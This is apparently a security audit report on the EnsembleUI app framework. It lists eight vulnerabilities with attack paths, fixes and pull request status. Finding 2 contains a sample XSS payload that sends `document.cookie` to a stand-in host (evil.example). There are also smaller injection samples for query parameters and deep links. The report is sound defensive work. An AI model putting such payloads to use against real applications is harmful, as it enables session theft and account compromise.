# Application Security Review — 2026-06-25

## Summary

Four validated medium+ vulnerabilities fixed with separate branches. PR automation created PRs where integration permissions allowed; all fix branches are pushed to origin for review.

## Findings with fixes

### 1. invokeAPI / SSE query parameter injection — Medium

- **Location:** `modules/ensemble/lib/framework/apiproviders/http_api_provider.dart`, `sse_api_provider.dart`
- **Attacker:** External user whose input flows into API `parameters` via YAML expression evaluation (e.g. `${searchInput}`)
- **Controlled input:** Parameter values containing `&` or `=` (e.g. `foo&role=admin`)
- **Attack path:** User input → `invokeAPI` GET/DELETE parameters → unencoded URL concatenation → backend receives injected query pairs
- **Impact:** HTTP parameter pollution; may bypass filters, alter authorization checks, or change API semantics on backends with inconsistent parameter precedence
- **Remediation:** `appendEncodedQueryParameters()` using `Uri.replace(queryParameters:)`
- **PR status:** PR created — https://github.com/EnsembleUI/ensemble/pull/2301 (branch `security/fix-api-query-param-injection`)

### 2. Chart.js config injection into eval/HTML — High

- **Location:** `modules/ensemble/lib/widget/visualization/chart_js/`, `modules/ensemble/lib/util/chart_utils.dart`
- **Attacker:** External party controlling API response data or user input bound to ChartJs `config`
- **Controlled input:** Malicious string such as `{});fetch('https://evil.example?c='+document.cookie);//`
- **Attack path:** Untrusted string config → interpolated into `JsWidget.scriptToInstantiate` / `loadHtmlString` → browser `eval()` or WebView inline JS → arbitrary JS in app origin
- **Impact:** XSS on web; session/token theft; actions as the victim user within the app origin
- **Remediation:** Validate string configs as JSON via `jsonEncode(jsonDecode(...))`; preserve trusted Map configs via `configFromMap`; restrict chart `id` charset
- **PR status:** Branch pushed — `security/fix-chartjs-eval-injection` (compare: https://github.com/EnsembleUI/ensemble/compare/main...security/fix-chartjs-eval-injection)

### 3. TabaPay WebView postMessage origin bypass — High

- **Location:** `modules/ensemble/lib/widget/fintech/tabapayconnect.dart`
- **Attacker:** Cross-origin frame, opener, or embedded page that can call `postMessage`
- **Controlled input:** Forged pipe-delimited TabaPay success payload
- **Attack path:** TabaPay WebView installs unrestricted `message` listener → attacker `postMessage` → `_handleTabaPayMessage` treats spoofed payload as success → `onSuccess` runs with attacker-controlled token fields
- **Impact:** Fraudulent payment token capture; unauthorized triggering of financial success handlers
- **Remediation:** `buildTabaPayPostMessageListenerScript()` requires `event.origin` to match configured iframe URL origin; fail closed for non-http(s) URIs
- **PR status:** Branch pushed — `security/fix-tabapay-post-message` (compare: https://github.com/EnsembleUI/ensemble/compare/main...security/fix-tabapay-post-message)

### 4. Native WebView JavaScript channel origin bypass — High

- **Location:** `modules/ensemble/lib/widget/webview/native/webviewstate.dart`
- **Attacker:** Cross-origin page loaded inside `InAppWebView` after navigation
- **Controlled input:** Arbitrary arguments passed to registered JavaScript channel handlers
- **Attack path:** WebView loads trusted URL with `javascriptChannels` → user navigates or page loads cross-origin content → attacker script invokes handler → YAML-configured action executes without origin check
- **Impact:** Unauthorized navigation, API invocation, or other actions wired to JS channels
- **Remediation:** Compare `controller.getUrl()` origin to allowed origin from configured WebView URL before executing channel callbacks
- **PR status:** PR created — https://github.com/EnsembleUI/ensemble/pull/2302 (branch `security/fix-webview-js-bridge`)

## Findings without PRs

### 5. OAuth/API fail-open when token missing — High

- **Location:** `http_api_provider.dart` (authorization block)
- **Attack path:** API with `authorization.oauthId` configured → `authorize()` returns null → request proceeds without `Authorization` header
- **Impact:** Sensitive API calls may reach backend unauthenticated
- **PR status:** No PR created: requires owner input (may break apps relying on optional auth)

### 6. Unrestricted outbound HTTP (client-side SSRF) — Medium–High

- **Location:** `http_api_provider.dart`, `invokablefetch.dart`
- **Attack path:** Evaluated URL from YAML/JS → requests to internal/metadata endpoints
- **Impact:** Internal network probing from user devices
- **PR status:** No PR created: requires owner input (URL policy definition)

### 7. Server credentials in non-secure GetStorage — High

- **Location:** `modules/auth/lib/signin/auth_manager.dart`
- **Attack path:** Bearer tokens in `user.data` persisted via plaintext GetStorage
- **Impact:** Credential theft on compromised devices
- **PR status:** No PR created: requires owner input (auth storage migration)

### 8. Deep link screen navigation without allowlist — Medium

- **Location:** `modules/ensemble/lib/deep_link_manager.dart`
- **Attack path:** `myapp://?screenName=AdminPanel` → direct navigation (screen id validation prevents path traversal but not authorization)
- **Impact:** Access screens intended to be gated by in-app auth
- **PR status:** No PR created: requires owner input (per-app policy)
